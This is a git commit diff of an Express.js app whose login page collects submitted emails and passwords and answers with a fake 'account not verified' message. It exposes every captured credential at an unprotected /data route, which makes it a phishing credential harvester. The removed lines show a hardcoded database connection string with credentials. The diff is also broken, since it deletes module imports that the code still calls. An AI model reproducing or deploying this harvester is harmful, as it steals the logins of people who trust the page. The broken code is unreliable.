3e85b0f259ca4ee773367b06249d6e1833f38b96
mianumer116 <128652547+mianumer116@users.noreply.github.com>
2024-05-18 13:05:03 +0500

    c

--- index.js
+++ index.js
@@ -1,54 +1,50 @@
 const express = require('express');
-const mongoose = require('mongoose');
-const cookieParser = require('cookie-parser');
-const multer = require('multer');
+
+
 const path = require('path');
-const upload = multer();
+
 const cors = require('cors');
-const fs = require('fs');
-
 const app = express();
-
-const { sc } = require('./models/todo');
-const passwords = "msohail";
 const port = 3000;
-const { setuser, getuser } = require('./controllers/auth');
-
 app.use(cors());
 app.use(upload.none());
 app.use(cookieParser());
 app.set('views', path.join(__dirname, 'views'));
 app.set('view engine', 'ejs');
 const data=[];
-const mongoURI = 'mongodb+srv://umer:umer@cluster0.avg1bjf.mongodb.net/railway?retryWrites=true&w=majority';
-
-mongoose.connect(mongoURI, {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
-});
-
-const db = mongoose.connection;
-db.on('error', console.error.bind(console, 'MongoDB connection error:'));
-db.once('open', () => {
-  console.log('Connected to MongoDB');
-});
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/', function (req, res) {
-  res.render('login');
+  try{
+
+    res.render('login');
+  }catch(error){
+    res.send(error)
+  }
 });
 
 app.post('/',function(req,res){
-  const {email,password}=req.body;
-  data.push(email,password);
-  res.send({message:"Your account is not verified Plz Verify your Account And Try Again "})
+  try{
+    const {email,password}=req.body;
+    data.push(email,password);
+    res.send({message:"Your account is not verified Plz Verify your Account And Try Again "})
+
+  }catch(error){
+    res.send(error)
+  }
+
   
 
 })
 app.get('/data',function(req,res){
-  res.send(data)
+  try{
+
+    res.send(data)
+  }catch(error){
+    res.send(error)
+  }
 })
 app.listen(port, () => {
   console.log('Server is listening on Port', port);
